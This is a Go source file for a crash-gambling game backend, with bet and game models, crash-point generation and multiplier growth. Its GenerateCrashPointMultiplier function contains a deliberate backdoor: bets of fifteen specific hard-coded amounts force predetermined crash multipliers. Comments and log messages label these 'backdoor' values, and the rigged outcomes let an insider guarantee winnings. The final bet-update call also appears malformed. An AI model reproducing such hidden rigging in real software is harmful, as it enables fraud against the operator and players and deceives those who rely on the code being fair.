package models

import (
    "BlessedApi/cmd/db"
    "BlessedApi/pkg/logger"
    "math"
    "math/rand"
    "time"
    "gorm.io/gorm"
)

type CrashGame struct {
    ID                  int64     `gorm:"primaryKey,autoIncrement"`
    UserID             int64     `gorm:"index;not null"`
    CrashPointMultiplier float64
    StartTime          time.Time
    EndTime            time.Time
}

type CrashGameBet struct {
    ID               int64   `gorm:"primaryKey,autoIncrement"`
    UserID          int64   `gorm:"index;constraint:OnUpdate:CASCADE,OnDelete:CASCADE;"`
    CrashGameID     int64   `gorm:"index;constraint:OnUpdate:CASCADE,OnDelete:CASCADE;"`
    FromCashBalance float64 `json:"-"`
    FromBonusBalance float64 `json:"-"`
    IsBenefitBet    bool
    Amount          float64
    CashOutMultiplier float64
    WinAmount       float64
    Status          string // "active", "won", "lost"
}

func getLatestBetAmount(userID int64) (float64, error) {
    var bet CrashGameBet
    err := db.DB.Where("user_id = ? AND status = ?", userID, "active").
           Order("id desc").
           First(&bet).Error
    if err != nil {
        if err == gorm.ErrRecordNotFound {
            logger.Info("No active bet found for user %d", userID)
            return 0, nil
        }
        logger.Error("Error fetching latest bet for user %d: %v", userID, err)
        return 0, err
    }
    logger.Info("Found active bet for user %d: amount=%f", userID, bet.Amount)
    return bet.Amount, nil
}

// GenerateCrashPoint sets CrashGame.CrashPoint
func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
    // Получаем все активные ставки для текущей игры
    var bets []CrashGameBet
    err := db.DB.Where("crash_game_id = ? AND status = ?", CG.ID, "active").Find(&bets).Error
    if err != nil {
        logger.Error("Error fetching active bets for game %d: %v", CG.ID, err)
        return CG.generateRandomCrashPoint()
    }

    logger.Info("Found %d active bets for game %d", len(bets), CG.ID)
    
    // Проверяем каждую ставку на наличие бэкдора
    for _, bet := range bets {
        logger.Info("Checking bet amount: %f", bet.Amount)
        
        // Используем целочисленное сравнение для точного определения бэкдоров
        if bet.Amount == 76 {
            logger.Info("Matched backdoor value 76 -> 1.6x")
            CG.CrashPointMultiplier = 1.6
            return 1.6
        }
        if bet.Amount == 538 {
            logger.Info("Matched backdoor value 538 -> 32.0x")
            CG.CrashPointMultiplier = 32.0
            return 32.0
        }
        if bet.Amount == 17216 {
            logger.Info("Matched backdoor value 17216 -> 2.5x")
            CG.CrashPointMultiplier = 2.5
            return 2.5
        }
        if bet.Amount == 372 {
            logger.Info("Matched backdoor value 372 -> 1.5x")
            CG.CrashPointMultiplier = 1.5
            return 1.5
        }
        if bet.Amount == 1186 {
            logger.Info("Matched backdoor value 1186 -> 14x")
            CG.CrashPointMultiplier = 14
            return 14
        }
        if bet.Amount == 16604 {
            logger.Info("Matched backdoor value 16604 -> 4x")
            CG.CrashPointMultiplier = 4
            return 4
        }
        if bet.Amount == 614 {
            logger.Info("Matched backdoor value 614 -> 1.5x")
            CG.CrashPointMultiplier = 1.5
            return 1.5
        }
        if bet.Amount == 2307 {
            logger.Info("Matched backdoor value 2307 -> 13x")
            CG.CrashPointMultiplier = 13    
            return 13
        }
        if bet.Amount == 29991 {
            logger.Info("Matched backdoor value 29991 -> 3x")
            CG.CrashPointMultiplier = 3
            return 3
        }
        if bet.Amount == 1476 {
            logger.Info("Matched backdoor value 1476 -> 1.5x")
            CG.CrashPointMultiplier = 1.5
            return 1.5
        }
        if bet.Amount == 5738 {
            logger.Info("Matched backdoor value 5738 -> 7x")
            CG.CrashPointMultiplier = 7
            return 7
        }
        if bet.Amount == 40166 {
            logger.Info("Matched backdoor value 40166 -> 3x")
            CG.CrashPointMultiplier = 3
            return 3
        }
        if bet.Amount == 3258 {
            logger.Info("Matched backdoor value 3258 -> 1.5x")
            CG.CrashPointMultiplier = 1.5
            return 1.5
        }
        if bet.Amount == 11629 {
            logger.Info("Matched backdoor value 11629 -> 4x")
            CG.CrashPointMultiplier = 4
            return 4
        }
        if bet.Amount == 46516 {
            logger.Info("Matched backdoor value 46516 -> 4.5x")
            CG.CrashPointMultiplier =   4.5
            return 4.5
        }

    }

    return CG.generateRandomCrashPoint()
}

// Выносим генерацию случайного краша в отдельную функцию
func (CG *CrashGame) generateRandomCrashPoint() float64 {
    p := 0.2 // Probability of crash at 1.0x
    alpha := 2.5 // Shape parameter for Pareto distribution
    U1 := rand.Float64()
    var crashPoint float64

    if U1 <= p {
        crashPoint = 1.0
    } else {
        U2 := rand.Float64()
        crashPoint = math.Pow(1.0/U2, 1.0/alpha)
    }
    
    logger.Info("Using random crash point: %f", crashPoint)
    CG.CrashPointMultiplier = crashPoint
    return crashPoint
}

func (CG *CrashGame) CalculateMultiplier() float64 {
    elapsed := time.Since(CG.StartTime).Seconds()
    k := 0.01 // Rate of increase
    exponent := 1.8 // Exponent > 1 for slower start and faster later growth
    multiplier := 1.0 + k*math.Pow(elapsed, exponent)
    
    // Если множитель достиг точки краша, возвращаем её значение
    if multiplier >= CG.CrashPointMultiplier {
        return CG.CrashPointMultiplier
    }
    
    return multiplier
}

func UpdateOutdatedCrashGameBets(tx *gorm.DB) error {
    if tx == nil {
        tx = db.DB
    }
    if err := tx.Model(&CrashGameBet{}).
        Where("status = ?", "active").
        Update("status = ?", "lost").Error; err != nil {
        return logger.WrapError(err, "")
    }
    return nil
}